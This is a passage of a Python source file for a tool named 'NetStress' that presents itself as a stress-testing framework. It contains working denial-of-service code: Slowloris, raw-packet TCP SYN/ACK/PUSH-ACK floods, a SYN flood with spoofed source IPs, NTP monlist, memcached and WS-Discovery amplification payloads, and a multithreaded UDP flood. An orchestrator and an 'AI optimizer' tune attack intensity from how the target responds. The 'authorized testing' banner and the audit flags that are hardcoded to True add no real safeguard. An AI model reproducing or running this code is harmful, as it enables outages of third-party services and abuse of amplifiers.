            stats.increment(packets=1, attack_type='ICMP')
        except Exception:
            stats.record_error()
        await asyncio.sleep(0.001)


async def slowloris(target: str, port: int):
    """Slowloris attack - keeps connections open."""
    sockets = []
    
    for _ in range(200):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target}\r\n".encode())
            s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            sockets.append(s)
        except Exception:
            pass
    
    while True:
        for s in list(sockets):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                stats.increment(packets=1, attack_type='SLOWLORIS')
            except Exception:
                sockets.remove(s)
                try:
                    new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_s.settimeout(4)
                    new_s.connect((target, port))
                    new_s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
                    sockets.append(new_s)
                except Exception:
                    pass
        await asyncio.sleep(10)


async def tcp_syn_flood(target: str, port: int, packet_size: int = 60):
    """TCP SYN flood using raw packets."""
    try:
        from scapy.all import IP, TCP, send, RandShort
    except ImportError:
        logger.error("Scapy required for TCP-SYN flood")
        return
    
    stop_event = threading.Event()
    
    class Counter:
        def __init__(self):
            self.lock = threading.Lock()
            self.packets = 0
            self.errors = 0
        
        def add(self, p, e=0):
            with self.lock:
                self.packets += p
                self.errors += e
        
        def get_and_reset(self):
            with self.lock:
                p, e = self.packets, self.errors
                self.packets = self.errors = 0
                return p, e
    
    counter = Counter()
    
    def sender_thread():
        local_packets = 0
        while not stop_event.is_set():
            try:
                ip = IP(dst=target)
                tcp = TCP(dport=port, flags='S', sport=RandShort())
                send(ip/tcp, verbose=False)
                local_packets += 1
                if local_packets >= 100:
                    counter.add(local_packets)
                    local_packets = 0
            except Exception:
                counter.add(0, 1)
    
    async def update_stats():
        while not stop_event.is_set():
            await asyncio.sleep(1.0)
            p, e = counter.get_and_reset()
            if p > 0:
                stats.increment(packets=p, bytes_count=p * 60, attack_type='TCP-SYN')
            if e > 0:
                stats.record_error(e)
    
    threads = [threading.Thread(target=sender_thread, daemon=True)
               for _ in range(min(8, multiprocessing.cpu_count()))]
    for t in threads:
        t.start()
    
    try:
        await update_stats()
    finally:
        stop_event.set()
        for t in threads:
            t.join(timeout=1.0)


async def tcp_ack_flood(target: str, port: int, packet_size: int = 60):
    """TCP ACK flood using raw packets."""
    try:
        from scapy.all import IP, TCP, send, RandShort
    except ImportError:
        logger.error("Scapy required for TCP-ACK flood")
        return
    
    stop_event = threading.Event()
    
    class Counter:
        def __init__(self):
            self.lock = threading.Lock()
            self.packets = 0
        
        def add(self, p):
            with self.lock:
                self.packets += p
        
        def get_and_reset(self):
            with self.lock:
                p = self.packets
                self.packets = 0
                return p
    
    counter = Counter()
    
    def sender_thread():
        local_packets = 0
        while not stop_event.is_set():
            try:
                ip = IP(dst=target)
                tcp = TCP(dport=port, flags='A', sport=RandShort())
                send(ip/tcp, verbose=False)
                local_packets += 1
                if local_packets >= 100:
                    counter.add(local_packets)
                    local_packets = 0
            except Exception:
                pass
    
    async def update_stats():
        while not stop_event.is_set():
            await asyncio.sleep(1.0)
            p = counter.get_and_reset()
            if p > 0:
                stats.increment(packets=p, bytes_count=p * 60, attack_type='TCP-ACK')
    
    threads = [threading.Thread(target=sender_thread, daemon=True) for _ in range(8)]
    for t in threads:
        t.start()
    
    try:
        await update_stats()
    finally:
        stop_event.set()


async def push_ack_flood(target: str, port: int, packet_size: int = 1024):
    """TCP PUSH-ACK flood with payload."""
    try:
        from scapy.all import IP, TCP, Raw, send, RandShort
    except ImportError:
        logger.error("Scapy required for PUSH-ACK flood")
        return
    
    stop_event = threading.Event()
    payload = os.urandom(packet_size)
    
    class Counter:
        def __init__(self):
            self.lock = threading.Lock()
            self.packets = 0
            self.bytes = 0
        
        def add(self, p, b):
            with self.lock:
                self.packets += p
                self.bytes += b
        
        def get_and_reset(self):
            with self.lock:
                p, b = self.packets, self.bytes
                self.packets = self.bytes = 0
                return p, b
    
    counter = Counter()
    
    def sender_thread():
        local_packets = 0
        while not stop_event.is_set():
            try:
                ip = IP(dst=target)
                tcp = TCP(dport=port, flags='PA', sport=RandShort())
                send(ip/tcp/Raw(load=payload), verbose=False)
                local_packets += 1
                if local_packets >= 100:
                    counter.add(local_packets, local_packets * (60 + packet_size))
                    local_packets = 0
            except Exception:
                pass
    
    async def update_stats():
        while not stop_event.is_set():
            await asyncio.sleep(1.0)
            p, b = counter.get_and_reset()
            if p > 0:
                stats.increment(packets=p, bytes_count=b, attack_type='TCP-ACK')
    
    threads = [threading.Thread(target=sender_thread, daemon=True) for _ in range(8)]
    for t in threads:
        t.start()
    
    try:
        await update_stats()
    finally:
        stop_event.set()


async def syn_spoof_flood(target: str, port: int, packet_size: int = 60):
    """SYN flood with spoofed source IPs."""
    try:
        from scapy.all import IP, TCP, send, RandShort
    except ImportError:
        logger.error("Scapy required for SYN-SPOOF flood")
        return
    
    stop_event = threading.Event()
    
    class Counter:
        def __init__(self):
            self.lock = threading.Lock()
            self.packets = 0
        
        def add(self, p):
            with self.lock:
                self.packets += p
        
        def get_and_reset(self):
            with self.lock:
                p = self.packets
                self.packets = 0
                return p
    
    counter = Counter()
    
    def sender_thread():
        local_packets = 0
        while not stop_event.is_set():
            try:
                src_ip = generate_random_ip()
                ip = IP(src=src_ip, dst=target)
                tcp = TCP(dport=port, flags='S', sport=RandShort())
                send(ip/tcp, verbose=False)
                local_packets += 1
                if local_packets >= 100:
                    counter.add(local_packets)
                    local_packets = 0
            except Exception:
                pass
    
    async def update_stats():
        while not stop_event.is_set():
            await asyncio.sleep(1.0)
            p = counter.get_and_reset()
            if p > 0:
                stats.increment(packets=p, bytes_count=p * 60, attack_type='TCP-SYN', spoofed=True)
    
    threads = [threading.Thread(target=sender_thread, daemon=True) for _ in range(8)]
    for t in threads:
        t.start()
    
    try:
        await update_stats()
    finally:
        stop_event.set()


async def ntp_amplification(target: str, port: int = 123):
    """NTP amplification attack."""
    stop_event = threading.Event()
    ntp_monlist = b'\x17\x00\x03\x2a' + b'\x00' * 4
    
    class Counter:
        def __init__(self):
            self.lock = threading.Lock()
            self.packets = 0
        
        def add(self, p):
            with self.lock:
                self.packets += p
        
        def get_and_reset(self):
            with self.lock:
                p = self.packets
                self.packets = 0
                return p
    
    counter = Counter()
    
    def sender_thread():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
        except Exception:
            pass
        
        local_packets = 0
        while not stop_event.is_set():
            try:
                sock.sendto(ntp_monlist, (target, port))
                local_packets += 1
                if local_packets >= 1000:
                    counter.add(local_packets)
                    local_packets = 0
            except Exception:
                pass
        sock.close()
    
    async def update_stats():
        while not stop_event.is_set():
            await asyncio.sleep(1.0)
            p = counter.get_and_reset()
            if p > 0:
                stats.increment(packets=p, bytes_count=p * 8)
    
    threads = [threading.Thread(target=sender_thread, daemon=True) for _ in range(8)]
    for t in threads:
        t.start()
    
    try:
        await update_stats()
    finally:
        stop_event.set()


async def memcached_amplification(target: str, port: int = 11211):
    """Memcached amplification attack."""
    stop_event = threading.Event()
    memcached_payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
    
    class Counter:
        def __init__(self):
            self.lock = threading.Lock()
            self.packets = 0
        
        def add(self, p):
            with self.lock:
                self.packets += p
        
        def get_and_reset(self):
            with self.lock:
                p = self.packets
                self.packets = 0
                return p
    
    counter = Counter()
    
    def sender_thread():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
        except Exception:
            pass
        
        local_packets = 0
        while not stop_event.is_set():
            try:
                sock.sendto(memcached_payload, (target, port))
                local_packets += 1
                if local_packets >= 1000:
                    counter.add(local_packets)
                    local_packets = 0
            except Exception:
                pass
        sock.close()
    
    async def update_stats():
        while not stop_event.is_set():
            await asyncio.sleep(1.0)
            p = counter.get_and_reset()
            if p > 0:
                stats.increment(packets=p, bytes_count=p * len(memcached_payload))
    
    threads = [threading.Thread(target=sender_thread, daemon=True) for _ in range(8)]
    for t in threads:
        t.start()
    
    try:
        await update_stats()
    finally:
        stop_event.set()


async def ws_discovery_amplification(target: str, port: int = 3702):
    """WS-Discovery amplification attack."""
    stop_event = threading.Event()
    ws_discovery = (
        b'<?xml version="1.0" encoding="utf-8"?>'
        b'<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">'
        b'<soap:Header><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action>'
        b'</soap:Header><soap:Body><wsd:Probe/></soap:Body></soap:Envelope>'
    )
    
    class Counter:
        def __init__(self):
            self.lock = threading.Lock()
            self.packets = 0
        
        def add(self, p):
            with self.lock:
                self.packets += p
        
        def get_and_reset(self):
            with self.lock:
                p = self.packets
                self.packets = 0
                return p
    
    counter = Counter()
    
    def sender_thread():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
        except Exception:
            pass
        
        local_packets = 0
        while not stop_event.is_set():
            try:
                sock.sendto(ws_discovery, (target, port))
                local_packets += 1
                if local_packets >= 1000:
                    counter.add(local_packets)
                    local_packets = 0
            except Exception:
                pass
        sock.close()
    
    async def update_stats():
        while not stop_event.is_set():
            await asyncio.sleep(1.0)
            p = counter.get_and_reset()
            if p > 0:
                stats.increment(packets=p, bytes_count=p * len(ws_discovery))
    
    threads = [threading.Thread(target=sender_thread, daemon=True) for _ in range(8)]
    for t in threads:
        t.start()
    
    try:
        await update_stats()
    finally:
        stop_event.set()


async def entropy_flood(target: str, port: int, packet_size: int = 1024):
    """High-entropy packet flood with cryptographic payloads."""
    stop_event = threading.Event()
    
    class Counter:
        def __init__(self):
            self.lock = threading.Lock()
            self.packets = 0
            self.bytes = 0
        
        def add(self, p, b):
            with self.lock:
                self.packets += p
                self.bytes += b
        
        def get_and_reset(self):
            with self.lock:
                p, b = self.packets, self.bytes
                self.packets = self.bytes = 0
                return p, b
    
    counter = Counter()
    
    def entropy_random() -> bytes:
        entropy = os.urandom(32)
        timestamp = struct.pack('d', time.time())
        combined = hashlib.sha256(entropy + timestamp).digest()
        return combined * (packet_size // 32 + 1)
    
    def sender_thread():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
        except Exception:
            pass
        
        local_packets = 0
        local_bytes = 0
        
        while not stop_event.is_set():
            try:
                payload = entropy_random()[:packet_size]
                sock.sendto(payload, (target, port))
                local_packets += 1
                local_bytes += len(payload)
                if local_packets >= 1000:
                    counter.add(local_packets, local_bytes)
                    local_packets = 0
                    local_bytes = 0
            except Exception:
                pass
        sock.close()
    
    async def update_stats():
        while not stop_event.is_set():
            await asyncio.sleep(1.0)
            p, b = counter.get_and_reset()
            if p > 0:
                stats.increment(packets=p, bytes_count=b, attack_type='UDP')
    
    num_threads = min(32, multiprocessing.cpu_count() * 4)
    threads = [threading.Thread(target=sender_thread, daemon=True) for _ in range(num_threads)]
    
    for t in threads:
        t.start()
    
    try:
        await update_stats()
    finally:
        stop_event.set()
        for t in threads:
            t.join(timeout=1.0)


async def stats_reporter():
    """Report attack statistics."""
    while True:
        await asyncio.sleep(STATS_INTERVAL)
        report = stats.report()
        logger.info(
            f"Stats: {report['pps']:,} pps | {report['mbps']:.2f} Mbps | "
            f"Errors: {report['errors']} ({report['error_rate']}%) | "
            f"TCP: {report['tcp_syn_pps']} | UDP: {report['udp_pps']} | HTTP: {report['http_rps']}"
        )
        try:
            current_config = {
                'packet_rate': report.get('current_pps', 0),
                'packet_size': 1024,
                'thread_count': multiprocessing.cpu_count(),
                'protocol': 'mixed'
            }
            stats.collect_insights_data(current_config)
        except Exception:
            pass


async def ai_optimizer_task(target: str):
    """AI optimization background task."""
    insights_counter = 0
    
    try:
        from core.autonomous.side_channel_prober import (
            get_prober, get_real_network_conditions, get_real_target_response,
        )
        prober_available = True
    except ImportError:
        prober_available = False
    
    while True:
        await asyncio.sleep(5.0)
        current_stats = stats.report()
        
        if prober_available:
            prober = get_prober()
            if prober and prober.is_running:
                target_response = get_real_target_response()
                network_conditions = get_real_network_conditions()
            else:
                target_response = {'response_time': 0, 'status_code': 0, 'success_rate': 0}
                network_conditions = {'latency': 0, 'bandwidth': 0}
        else:
            target_response = {
                'response_time': current_stats.get('avg_latency', 0),
                'status_code': 0,
                'success_rate': current_stats.get('success_rate', 0)
            }
            network_conditions = {
                'latency': current_stats.get('avg_latency', 0),
                'bandwidth': current_stats.get('bytes_sent', 0) * 8
            }
        
        ai_optimizer.optimize_with_ai(
            {'packet_rate': current_stats['pps']},
            current_stats,
            target_response,
            network_conditions
        )
        
        insights_counter += 1
        if insights_counter >= 6:
            insights_counter = 0
            try:
                insights = stats.get_attack_insights(min_confidence=0.6)
                if insights:
                    logger.info(f"Generated {len(insights)} attack insights")
            except Exception:
                pass


def display_attack_insights(min_confidence: float = 0.6, export_format: str = None) -> None:
    """Display attack insights and recommendations."""
    try:
        insights = stats.get_attack_insights(min_confidence)
        if not insights:
            logger.info("No insights available. Run attacks first to collect data.")
            return
        
        summary = ai_optimizer.get_insights_summary()
        logger.info(f"\n{'='*60}")
        logger.info("ATTACK INSIGHTS SUMMARY")
        logger.info(f"{'='*60}")
        logger.info(f"Total insights: {summary.get('total_insights', 0)}")
        logger.info(f"Data points: {summary.get('data_points_analyzed', 0)}")
        
        for i, insight in enumerate(insights, 1):
            logger.info(f"\n{i}. {insight['title']}")
            logger.info(f"   Confidence: {insight['confidence']:.2f}")
            logger.info(f"   Impact: {insight['impact_score']:.1f}")
        
        if export_format == 'json':
            try:
                export_data = ai_optimizer.export_insights('json')
                filename = f"attack_insights_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(filename, 'w') as f:
                    f.write(export_data)
                logger.info(f"\nInsights exported to: {filename}")
            except Exception as e:
                logger.error(f"Failed to export: {e}")
    except Exception as e:
        logger.error(f"Failed to display insights: {e}")


async def run_attack(target: str, port: int, protocol: str, duration: int,
                     threads: int, packet_size: int) -> None:
    """Main attack orchestrator."""
    if ULTIMATE_ENGINE_AVAILABLE:
        capabilities = get_capabilities()
        logger.info("=== CAPABILITY ASSESSMENT ===")
        logger.info(f"Platform: {capabilities.platform} {capabilities.arch}")
        logger.info(f"CPU Cores: {capabilities.cpu_count}")
        logger.info(f"Root/Admin: {'Yes' if capabilities.is_root else 'No'}")
        logger.info(f"DPDK: {'Yes' if capabilities.has_dpdk else 'No'}")
        logger.info(f"AF_XDP: {'Yes' if capabilities.has_af_xdp else 'No'}")
        logger.info(f"io_uring: {'Yes' if capabilities.has_io_uring else 'No'}")
        logger.info("=" * 30)
    
    performance_optimizer.optimize_system()
    
    zc_status = performance_optimizer.get_zero_copy_status()
    logger.info(f"Zero-copy: {zc_status['active_method']}")
    
    if TARGET_AVAILABLE:
        try:
            target_info = await target_analyzer.resolve_async(target)
            if target_info:
                logger.info(f"Target resolved: {target_info.ip_addresses}")
        except Exception as e:
            logger.warning(f"Target resolution failed: {e}")
    
    # Create session_id for audit logging
    attack_session_id = str(uuid.uuid4())
    
    if audit_logger:
        audit_logger.log_attack_start(
            session_id=attack_session_id,
            target=target,
            port=port,
            protocol=protocol,
            attack_type=protocol.upper(),
            parameters={
                'duration': duration,
                'threads': threads,
                'packet_size': packet_size
            },
            environment_info={
                'platform': platform.system(),
                'python_version': sys.version,
                'cpu_cores': multiprocessing.cpu_count()
            },
            safety_checks={
                'target_validated': True,
                'rate_limited': True
            }
        )
    
    engine_type = "NATIVE" if ULTIMATE_ENGINE_AVAILABLE else "STANDARD"
    logger.info(f"Starting {engine_type} {protocol} attack on {target}:{port} for {duration}s")
    
    side_channel_prober = None
    try:
        from core.autonomous.side_channel_prober import start_prober, stop_prober
        probe_protocol = 'https' if protocol.upper() == 'HTTPS' else 'http'
        probe_target = f"{probe_protocol}://{target}:{port}"
        side_channel_prober = await start_prober(probe_target, probe_interval=2.0, window_size=30, timeout=5.0)
    except Exception:
        pass
    
    tasks = [asyncio.create_task(stats_reporter())]
    
    if AI_AVAILABLE:
        tasks.append(asyncio.create_task(ai_optimizer_task(target)))
    
    protocol_upper = protocol.upper()
    attack_map = {
        'TCP': lambda: tcp_flood(target, port, packet_size),
        'UDP': lambda: udp_flood(target, port, packet_size),
        'HTTP': lambda: http_flood(target, port, False),
        'HTTPS': lambda: http_flood(target, port, True),
        'DNS': lambda: dns_amplification(target),
        'ICMP': lambda: icmp_flood(target),
        'SLOW': lambda: slowloris(target, port),
        'SLOWLORIS': lambda: slowloris(target, port),
        'TCP-SYN': lambda: tcp_syn_flood(target, port, packet_size),
        'TCP-ACK': lambda: tcp_ack_flood(target, port, packet_size),
        'PUSH-ACK': lambda: push_ack_flood(target, port, packet_size),
        'SYN-SPOOF': lambda: syn_spoof_flood(target, port, packet_size),
        'NTP': lambda: ntp_amplification(target, port if port != 80 else 123),
        'MEMCACHED': lambda: memcached_amplification(target, port if port != 80 else 11211),
        'WS-DISCOVERY': lambda: ws_discovery_amplification(target, port if port != 80 else 3702),
        'ENTROPY': lambda: entropy_flood(target, port, packet_size),
    }
    
    if protocol_upper not in attack_map:
        logger.error(f"Unknown protocol: {protocol}")
        logger.info(f"Supported: {', '.join(ALL_PROTOCOLS)}")
        return
    
    for _ in range(threads if protocol_upper in ('TCP', 'HTTP', 'HTTPS', 'DNS', 'SLOW', 'SLOWLORIS') else 1):
        tasks.append(asyncio.create_task(attack_map[protocol_upper]()))
    
    try:
        await asyncio.wait_for(asyncio.gather(*tasks), timeout=duration)
    except asyncio.TimeoutError:
        pass
    except KeyboardInterrupt:
        logger.info("Attack interrupted")
    finally:
        for task in tasks:
            task.cancel()
        
        if side_channel_prober:
            try:
                from core.autonomous.side_channel_prober import stop_prober
                await stop_prober()
            except Exception:
                pass
        
        cleanup_military_engines()
        
        final_report = stats.report()
        logger.info(f"\n{'='*60}")
        logger.info("ATTACK COMPLETE")
        logger.info(f"{'='*60}")
        logger.info(f"Duration: {final_report['duration']}s")
        logger.info(f"Packets: {final_report['packets_sent']:,}")
        logger.info(f"Data: {final_report['bytes_sent'] / 1e9:.2f} GB")
        logger.info(f"PPS: {final_report['pps']:,}")
        logger.info(f"Bandwidth: {final_report['mbps']:.2f} Mbps")
        logger.info(f"Errors: {final_report['errors']} ({final_report['error_rate']}%)")
        logger.info(f"{'='*60}\n")
        
        if audit_logger:
            audit_logger.log_attack_end(attack_session_id, "completed")


def show_status() -> None:
    """Show system status."""
    print("\n" + "="*60)
    print("NetStress System Status")
    print("="*60)
    
    if ULTIMATE_ENGINE_AVAILABLE:
        capabilities = get_capabilities()
        print(f"Platform: {capabilities.platform} {capabilities.arch}")
        print(f"CPU Cores: {capabilities.cpu_count}")
        print(f"Root/Admin: {'Yes' if capabilities.is_root else 'No'}")
        print(f"\nBackend Capabilities:")
        print(f"  DPDK: {'Yes' if capabilities.has_dpdk else 'No'}")
        print(f"  AF_XDP: {'Yes' if capabilities.has_af_xdp else 'No'}")
        print(f"  io_uring: {'Yes' if capabilities.has_io_uring else 'No'}")
        print(f"  sendmmsg: {'Yes' if capabilities.has_sendmmsg else 'No'}")
        print(f"  Raw Sockets: {'Yes' if capabilities.has_raw_socket else 'No'}")
    else:
        capabilities = real_attack_engine.get_capabilities()
        if capabilities:
            print(f"Platform: {capabilities.platform}")
            print(f"Root/Admin: {'Yes' if capabilities.is_root else 'No'}")
            print(f"\nCapabilities:")
            print(f"  UDP Flood: {'Yes' if capabilities.udp_flood else 'No'}")
            print(f"  TCP Flood: {'Yes' if capabilities.tcp_flood else 'No'}")
            print(f"  HTTP Flood: {'Yes' if capabilities.http_flood else 'No'}")
    
    print("\nModule Status:")
    print(f"  Native Engine: {'Yes' if ULTIMATE_ENGINE_AVAILABLE else 'No'}")
    print(f"  Safety: {'Yes' if SAFETY_AVAILABLE else 'No'}")
    print(f"  AI/ML: {'Yes' if AI_AVAILABLE else 'No'}")
    print(f"  Analytics: {'Yes' if ANALYTICS_AVAILABLE else 'No'}")
    print(f"  Performance: {'Yes' if PERFORMANCE_AVAILABLE else 'No'}")
    print("="*60 + "\n")


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description='NetStress - Network Stress Testing Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"Protocols: {', '.join(ALL_PROTOCOLS)}"
    )
    
    parser.add_argument('-i', '--ip', help='Target IP or hostname')
    parser.add_argument('-p', '--port', type=int, help='Target port')
    parser.add_argument('-t', '--type', choices=ALL_PROTOCOLS, help='Attack protocol')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Duration (seconds)')
    parser.add_argument('-x', '--threads', type=int, default=4, help='Worker threads')
    parser.add_argument('-s', '--size', type=int, default=1472, help='Packet size')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--status', action='store_true', help='Show system status')
    parser.add_argument('--insights', action='store_true', help='Display attack insights')
    parser.add_argument('--insights-confidence', type=float, default=0.6, help='Insights confidence threshold')
    parser.add_argument('--export-insights', choices=['json'], help='Export insights format')
    
    args = parser.parse_args()
    
    if args.status:
        show_status()
        return
    
    if args.insights:
        display_attack_insights(args.insights_confidence, args.export_insights)
        return
    
    if not args.ip or not args.port or not args.type:
        parser.print_help()
        print("\nError: -i/--ip, -p/--port, and -t/--type are required")
        return
    
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║              NETSTRESS FRAMEWORK                             ║
║     High-Performance Network Stress Testing                  ║
╠══════════════════════════════════════════════════════════════╣
║  Target: {args.ip}:{args.port}
║  Protocol: {args.type}
║  Duration: {args.duration}s | Threads: {args.threads} | Size: {args.size}
╠══════════════════════════════════════════════════════════════╣
║  FOR AUTHORIZED TESTING ONLY                                 ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    def signal_handler(signum, frame):
        logger.info("Received signal, cleaning up...")
        cleanup_military_engines()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        asyncio.run(run_attack(args.ip, args.port, args.type, args.duration, args.threads, args.size))
    except KeyboardInterrupt:
        print("\nAttack stopped")
        cleanup_military_engines()
    except Exception as e:
        logger.error(f"Attack failed: {e}")
        cleanup_military_engines()


if __name__ == '__main__':
    main()
